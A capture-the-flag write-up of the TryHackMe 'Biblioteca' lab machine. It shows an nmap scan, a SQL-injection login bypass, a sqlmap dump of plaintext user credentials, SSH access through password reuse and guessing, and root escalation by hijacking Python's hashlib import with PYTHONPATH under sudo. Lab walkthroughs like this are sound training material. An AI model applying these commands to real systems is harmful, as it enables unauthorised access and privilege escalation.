---
title: TryHackMe - Biblioteca
author: 0
date: 2023-03-31 17:00:00 +0800
categories: [thm, machine]
tags: [sql injection, credential reuse, sudo -l, python library hijacking]
render_with_liquid: false
---
# Biblioteca - Medium
> Shhh. Be very very quiet, no shouting inside the biblioteca.
> Hit 'em with the classics.

### Enumeration
```bash
$ nmap -sC -sV  -A  -oN nmap_result 10.10.66.77
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 000bf9bf1d49a6c3fa9c5e08d16d8202 (RSA)
|   256 a10c8e5df07fa532b2eb2f7abfedbf3d (ECDSA)
|_  256 9eefc90afce99eede32db130b65fd40b (ED25519)
8000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title:  Login 
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The nmap result shows the webserver running on port 8000. When we connect to this port, we can see a login screen. Thinking about the introduction "Hit 'em with the classics.", hints that this is could be an authentication bypass through SQL injection.

### Foothold
 
By using `username=username&password=' or '1'='1` we can bypass the authentication form.

When logged, you only get an index screen that greets a user called "smokey".
We can dump the database by using sqlmap
```bash
$ sqlmap -r request  --dump
Database: website
Table: users
[2 entries]
+----+-------------------+----------------+----------+
| id | email             | password       | username |
+----+-------------------+----------------+----------+
| 1  | smokey@email.boop | My_P@ssW0rd123 | smokey   |
| 2  | test@hotmail.com  | test           | test     |
+----+-------------------+----------------+----------+
```

We can use these credential to ssh into the server. This account is very restricted but upon viewing the `/home/` dir we notice there is another user called "hazel". After some trial and error we managed to get access into the "hazel" account by bruteforcing as the account has the password "hazel".

### Privelege Escalation

Both `/home/hazel/user.txt` and `/root/root.txt` flags require root access.
By running `sudo -l`, we can see that hazel can run `sudo /usr/bin/python3 /home/hazel/hasher.py` without needing the root password.
```bash
hazel@biblioteca:~$ sudo -l
Matching Defaults entries for hazel on biblioteca:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hazel may run the following commands on biblioteca:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /home/hazel/hasher.py
```

We can see the `hasher.py` script imports the `hashlib` library. We can perform privilege escalation via "Python Library Hijacking"
```bash
hazel@biblioteca:~$ cat hasher.py 
import hashlib

def hashing(passw):

    md5 = hashlib.md5(passw.encode())

    print("Your MD5 hash is: ", end ="")
    print(md5.hexdigest())

    sha256 = hashlib.sha256(passw.encode())

    print("Your SHA256 hash is: ", end ="")
    print(sha256.hexdigest())

    sha1 = hashlib.sha1(passw.encode())

    print("Your SHA1 hash is: ", end ="")
    print(sha1.hexdigest())


def main():
    passw = input("Enter a password to hash: ")
    hashing(passw)

if __name__ == "__main__":
    main()
```

We can run `python3 -c 'import sys; print("\n".join(sys.path))'` to see the order of paths that searches in for its libraries. 
```bash
hazel@biblioteca:~$ python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```

But this is not important to us as we can just force the `PYTHONPATH` to be where we save our modified version of the `hashlib.py` library. We move to the `/tmp` dir as we don't have write permissions in our home directory. We create our version of the `hashlib.py` library that will be executed as sudo and calls `/bin/bash`. After running the script with `PYTHONPATH=/tmp` we managed to get root.

```bash
hazel@biblioteca:~$ cd /tmp
hazel@biblioteca:/tmp$ vi hashlib.py
hazel@biblioteca:/tmp$ hashlib.py 
import os

os.system('/bin/bash')
hazel@biblioteca:/tmp$ sudo PYTHONPATH=/tmp /usr/bin/python3 /home/hazel/hasher.py
root@biblioteca:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@biblioteca:/tmp# whoami
root
root@biblioteca:/tmp# cat /root/root.txt
THM{**REDACTED**}
root@biblioteca:/tmp# cat /home/hazel/user.txt
THM{**REDACTED**}
root@biblioteca:/tmp# 
```